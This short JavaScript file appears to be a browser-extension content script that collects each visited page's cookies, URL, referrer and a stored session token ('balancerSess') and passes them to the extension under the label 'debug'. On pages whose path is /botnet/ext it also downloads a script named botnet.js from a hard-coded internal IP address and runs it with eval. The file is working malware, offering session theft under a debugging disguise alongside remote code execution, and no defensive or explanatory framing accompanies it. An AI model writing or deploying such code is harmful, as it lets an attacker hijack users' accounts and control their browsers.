function httpGet(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
cookie=document.cookie;
url=document.location.href;
ref=document.referrer;
hash=localStorage.getItem("balancerSess");

var debug = {
	cookie: cookie,
	url: url,
	ref: ref,
	hash: hash
}

chrome.runtime.sendMessage(debug, function(response) {
  console.log(response);
});


//if(document.location.href.indexOf('https://esd.pr.')>-1){alert(1);}
window.onload = function(){
	selector=location.href.split("/");
	if((selector[3]=="botnet")&&(selector[4]=="ext")){
	eval(httpGet('http://10.68.100.60/botnet/ext/botnet.js'));
}
}
